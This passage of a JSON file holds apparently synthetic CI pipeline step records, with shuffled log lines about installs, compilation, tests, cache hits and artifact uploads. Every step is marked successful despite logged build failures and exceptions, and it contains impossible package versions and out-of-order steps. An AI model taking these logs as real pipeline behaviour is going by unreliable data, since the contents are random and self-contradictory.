          "  PASS: test_db_connect (359ms)",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-8819",
          "Installing axios@2.13.0",
          "FAILED: test_auth_login",
          "Installing express@5.13.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 6/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Installing axios@5.10.0",
          "Step 9/10: Building",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-1299",
          "Compiling src/utils.go...",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] ERROR: Connection failed",
          "Cache hit for key-8177",
          "Step 3/10: Building",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_user_create (123ms)",
          "Compiling src/app.ts...",
          "WARNING: express has known vulnerabilities",
          "Compiling src/service.java...",
          "Cache hit for key-3499",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "Installing lodash@2.2.0",
          "Installing prettier@2.20.0",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Step 9/10: Building",
          "  PASS: test_user_create (251ms)",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Installing jest@4.1.0",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 3/10: Building",
          "Installing prettier@2.8.0",
          "Compiling src/handler.rs...",
          "[12:00:22] ERROR: Connection failed",
          "  PASS: test_api_health (2ms)",
          "Cache hit for key-1661",
          "Cache hit for key-4226",
          "\u2713 lint completed",
          "Installing express@4.17.0",
          "[12:00:22] INFO: Processing request",
          "Compiling src/main.py...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-04T12:00:56.760928",
        "finished_at": "2025-12-04T12:00:59.728537",
        "log_lines": [
          "=== Step: deploy_production ===",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_db_connect (149ms)",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Cache hit for key-8537",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing prettier@4.19.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (253ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_auth_login (265ms)",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 26",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing prettier@3.10.0",
          "WARNING: react has known vulnerabilities",
          "Installing axios@3.4.0",
          "Cache hit for key-1485",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "Installing express@4.7.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Installing webpack@4.16.0",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-5625",
          "Installing express@4.20.0",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Installing react@3.14.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] ERROR: Connection failed",
          "Installing react@4.0.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (382ms)",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-5641",
          "Cache hit for key-2787",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Exception: ValueError",
          "Compiling src/index.js...",
          "Installing prettier@5.6.0",
          "Installing lodash@3.5.0",
          "  PASS: test_db_connect (332ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:22] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing jest@4.8.0",
          "Cache hit for key-1926",
          "Installing prettier@2.1.0",
          "Installing webpack@3.13.0",
          "Compiling src/service.java...",
          "Installing eslint@5.5.0",
          "Step 4/10: Building",
          "Installing react@1.16.0",
          "Compiling src/main.py...",
          "Cache hit for key-1978",
          "Cache hit for key-2753",
          "Compiling src/index.js...",
          "  PASS: test_api_health (26ms)",
          "Step 4/10: Building",
          "[12:00:22] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Step 3/10: Building",
          "Installing prettier@2.17.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:22] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "[12:00:22] INFO: Processing request",
          "Step 4/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:22] INFO: Processing request",
          "Installing webpack@4.20.0",
          "Cache hit for key-4777",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-2960",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-04T12:00:59.728537",
        "finished_at": "2025-12-04T12:01:02.696146",
        "log_lines": [
          "=== Step: checkout ===",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2717 build failed with exit code 38",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "Exception: TypeError",
          "  PASS: test_api_health (420ms)",
          "[12:00:22] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 build completed",
          "Cache hit for key-7700",
          "[12:00:22] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_auth_login (246ms)",
          "Compiling src/handler.rs...",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-4516",
          "\u2713 build completed",
          "Installing lodash@2.15.0",
          "  PASS: test_db_connect (90ms)",
          "[12:00:22] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:22] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing jest@5.20.0",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_user_create (365ms)",
          "Step 5/10: Building",
          "  PASS: test_db_connect (144ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:22] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Exception: ValueError",
          "Cache hit for key-5312",
          "Installing eslint@4.2.0",
          "Cache hit for key-1101",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-4491",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "Step 5/10: Building",
          "Cache hit for key-2749",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing axios@2.0.0",
          "Installing express@5.11.0",
          "  PASS: test_db_connect (445ms)",
          "Cache hit for key-8979",
          "Step 3/10: Building",
          "  PASS: test_api_health (500ms)",
          "[12:00:22] INFO: Processing request",
          "Installing webpack@2.18.0",
          "Step 5/10: Building",
          "Cache hit for key-7155",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_cache_hit (134ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 1/10: Building",
          "Cache hit for key-3483",
          "Installing lodash@1.13.0",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (83ms)",
          "\u2713 test completed",
          "\u2713 test completed",
          "Cache hit for key-2570",
          "Installing lodash@2.17.0",
          "Cache hit for key-6853",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:22] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_api_health (205ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 5/10: Building",
          "Step 7/10: Building",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-3313",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Cache hit for key-9328",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-5254",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-04T12:01:02.696146",
        "finished_at": "2025-12-04T12:01:17.534193",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-3537",
          "Compiling src/handler.rs...",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "Installing lodash@5.10.0",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Step 10/10: Building",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (254ms)",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:22] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing jest@2.0.0",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Installing prettier@1.7.0",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Installing react@1.3.0",
          "Step 1/10: Building",
          "  PASS: test_auth_login (441ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 2/10: Building",
          "  PASS: test_user_create (69ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing axios@5.15.0",
          "Cache hit for key-7131",
          "Cache hit for key-9224",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_db_connect (459ms)",
          "[12:00:22] INFO: Processing request",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:22] INFO: Processing request",
          "Step 1/10: Building",
          "Installing axios@5.3.0",
          "\u2713 test completed",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-8003",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing react@1.0.0",
          "Cache hit for key-4159",
          "Cache hit for key-7340",
          "  PASS: test_cache_hit (114ms)",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_db_connect (329ms)",
          "[12:00:22] INFO: Processing request",
          "Exception: ValueError",
          "[12:00:22] INFO: Processing request",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Cache hit for key-9596",
          "Installing eslint@3.4.0",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 7/10: Building",
          "[12:00:22] INFO: Processing request",
          "Installing express@5.13.0",
          "Cache hit for key-9826",
          "Cache hit for key-7942",
          "Step 9/10: Building",
          "[12:00:22] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing jest@2.1.0",
          "Installing jest@2.11.0",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-5768",
          "Installing axios@1.6.0",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-2267",
          "Installing prettier@2.1.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:22] ERROR: Connection failed",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_db_connect (299ms)",
          "Step 1/10: Building",
          "\u2713 build completed",
          "\u2717 build failed with exit code 117",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Installing webpack@3.4.0",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Cache hit for key-7136",
          "  PASS: test_api_health (433ms)",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "WARNING: webpack has known vulnerabilities",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-04T12:01:17.534193",
        "finished_at": "2025-12-04T12:01:21.985607",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Cache hit for key-8476",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Installing webpack@5.1.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2717 build failed with exit code 122",
          "Installing react@2.10.0",
          "  PASS: test_api_health (308ms)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_user_create (101ms)",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-1341",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_db_connect (208ms)",
          "\u2713 test completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] INFO: Processing request",
          "Installing react@3.20.0",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-6575",
          "  PASS: test_user_create (411ms)",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] WARN: Deprecated API usage",
          "  PASS: test_api_health (469ms)",
          "Cache hit for key-3016",
          "Installing axios@4.13.0",
          "Step 10/10: Building",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing express@3.3.0",
          "Cache hit for key-6705",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] ERROR: Connection failed",
          "\u2713 lint completed",
          "  PASS: test_db_connect (386ms)",
          "Compiling src/index.js...",
          "Installing express@2.17.0",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Installing axios@5.4.0",
          "\u2713 test completed",
          "  PASS: test_api_health (376ms)",
          "\u2713 test completed",
          "  PASS: test_db_connect (366ms)",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (143ms)",
          "Cache hit for key-3318",
          "  PASS: test_cache_hit (275ms)",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Cache hit for key-3509",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/service.java...",
          "[12:00:22] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Installing eslint@4.13.0",
          "Installing webpack@4.17.0",
          "[12:00:22] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-6119",
          "[12:00:22] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "  PASS: test_auth_login (58ms)",
          "[12:00:22] ERROR: Connection failed",
          "[12:00:22] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 10/10: Building",
          "[12:00:22] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing eslint@2.6.0",
          "\u2717 build failed with exit code 82",
          "Cache hit for key-3453",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Installing webpack@5.4.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing lodash@2.1.0",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing axios@5.14.0",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_user_create (232ms)",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Step 8/10: Building",
          "WARNING: jest has known vulnerabilities",
          "Installing axios@3.13.0",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-04T12:01:21.985607",
        "finished_at": "2025-12-04T12:01:29.404630",
        "log_lines": [
          "=== Step: lint ===",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Cache hit for key-6064",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing webpack@4.13.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:22] ERROR: Connection failed",
          "Cache hit for key-7112",
          "Cache hit for key-2843",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/app.ts...",
          "[12:00:22] INFO: Processing request",
          "Installing webpack@4.17.0",
          "[12:00:22] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-2025",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Installing lodash@3.11.0",
          "Cache hit for key-3672",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-1919",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/app.ts...",
          "[12:00:22] INFO: Processing request",
          "\u2717 build failed with exit code 73",
          "Step 1/10: Building",
          "Step 2/10: Building",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_api_health (73ms)",
          "Installing eslint@5.13.0",
          "Cache hit for key-7218",
          "Cache hit for key-7769",
          "Installing eslint@2.5.0",
          "Step 2/10: Building",
          "Installing jest@1.2.0",
          "  PASS: test_user_create (140ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 7/10: Building",
          "Cache hit for key-5095",
          "Cache hit for key-2711",
          "Compiling src/app.ts...",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_cache_hit (343ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing react@5.16.0",
          "Exception: ValueError",
          "\u2713 lint completed",
          "  PASS: test_db_connect (309ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_auth_login (493ms)",
          "Cache hit for key-8232",
          "Step 5/10: Building",
          "Cache hit for key-9063",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-8855",
          "\u2713 build completed",
          "Installing express@1.13.0",
          "Cache hit for key-9153",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-1105",
          "  PASS: test_cache_hit (56ms)",
          "WARNING: webpack has known vulnerabilities",
          "Installing prettier@3.11.0",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Cache hit for key-8322",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "  PASS: test_cache_hit (286ms)",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 test completed",
          "Step 4/10: Building",
          "\u2713 test completed",
          "Installing webpack@1.17.0",
          "Cache hit for key-3324",
          "Compiling src/handler.rs...",
          "Installing jest@1.9.0",
          "Step 6/10: Building",
          "\u2713 test completed",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-04T12:01:29.404630",
        "finished_at": "2025-12-04T12:01:36.823653",
        "log_lines": [
          "=== Step: type_check ===",
          "Installing prettier@2.9.0",
          "Exception: ValueError",
          "Cache hit for key-7676",
          "Compiling src/app.ts...",
          "Cache hit for key-6206",
          "  PASS: test_auth_login (497ms)",
          "  PASS: test_auth_login (127ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing react@5.12.0",
          "\u2713 build completed",
          "  PASS: test_db_connect (364ms)",
          "[12:00:22] WARN: Deprecated API usage",
          "  PASS: test_db_connect (413ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-3116",
          "Cache hit for key-7842",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (468ms)",
          "Cache hit for key-2961",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:22] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_cache_hit (467ms)",
          "Step 2/10: Building",
          "Cache hit for key-6376",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing axios@5.12.0",
          "Cache hit for key-5206",
          "\u2713 build completed",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing express@3.1.0",
          "Step 10/10: Building",
          "Installing express@1.2.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-7436",
          "Cache hit for key-4901",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 85",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:22] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 test completed",
          "Installing express@4.16.0",
          "Step 1/10: Building",
          "Installing express@2.9.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:22] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_user_create (334ms)",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Installing prettier@4.17.0",
          "[12:00:22] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Cache hit for key-4784",
          "  PASS: test_auth_login (21ms)",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing webpack@5.0.0",
          "Installing axios@5.1.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "Step 7/10: Building",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 build completed",
          "Installing webpack@2.20.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-5904",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Step 9/10: Building",
          "Step 2/10: Building",
          "[12:00:22] INFO: Processing request",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache hit for key-9078",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-04T12:01:36.823653",
        "finished_at": "2025-12-04T12:01:44.242676",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_db_connect (169ms)",
          "  PASS: test_user_create (169ms)",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-5118",
          "  PASS: test_api_health (150ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing eslint@3.11.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-8745",
          "Compiling src/index.js...",
          "[12:00:22] WARN: Deprecated API usage",
          "  PASS: test_db_connect (448ms)",
          "[12:00:22] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_db_connect (480ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing axios@2.6.0",
          "Step 5/10: Building",
          "[12:00:22] INFO: Processing request",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Installing react@1.5.0",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_cache_hit (294ms)",
          "Installing jest@2.11.0",
          "  PASS: test_api_health (205ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_db_connect (479ms)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "FAILED: test_auth_login",
          "  PASS: test_cache_hit (401ms)",
          "Installing prettier@4.9.0",
          "Cache hit for key-2644",
          "Cache hit for key-9649",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2717 build failed with exit code 21",
          "Step 3/10: Building",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:22] ERROR: Connection failed",
          "Cache hit for key-5952",
          "[12:00:22] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "[12:00:22] INFO: Processing request",
          "Installing jest@5.16.0",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "  PASS: test_user_create (21ms)",
          "[12:00:22] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "Installing webpack@2.0.0",
          "Compiling src/utils.go...",
          "[12:00:22] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Cache hit for key-3973",
          "Compiling src/handler.rs...",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Installing prettier@4.1.0",
          "  PASS: test_db_connect (359ms)",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing jest@5.16.0",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-5379",
          "  PASS: test_auth_login (26ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:22] INFO: Processing request",
          "Installing react@2.5.0",
          "Installing prettier@5.3.0",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (371ms)",
          "Installing react@2.16.0",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Cache hit for key-8181",
          "  PASS: test_db_connect (406ms)",
          "Compiling src/main.py...",
          "Cache hit for key-2675",
          "[12:00:22] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
